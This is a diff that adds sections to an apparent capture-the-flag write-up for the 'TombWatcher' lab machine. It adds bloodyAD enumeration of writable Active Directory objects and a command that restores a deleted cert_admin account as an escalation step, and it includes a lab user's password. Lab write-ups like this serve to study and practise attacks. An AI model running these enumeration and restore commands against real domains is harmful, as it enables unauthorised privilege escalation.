@@ -1022,12 +1022,55 @@ Certificate Templates
 
 ```
 
+```
+bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' get writable
+
+distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb
+permission: WRITE
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tombwatcher,DC=htb
+permission: WRITE
+
+distinguishedName: CN=john,CN=Users,DC=tombwatcher,DC=htb
+permission: WRITE
+
+distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: DC=tombwatcher.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.tombwatcher.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD
+
+```
+
+
+
 ### Exploitation
 
 Step-by-step privilege escalation.
+```
+ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set restore "CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb"
+[+] CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
 
-```shell
-# Commands used
 ```
 
 ---
